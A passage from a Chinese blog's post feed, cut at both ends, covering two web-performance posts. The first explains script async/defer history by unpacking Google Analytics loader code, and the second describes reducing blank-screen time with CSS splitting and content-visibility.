href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 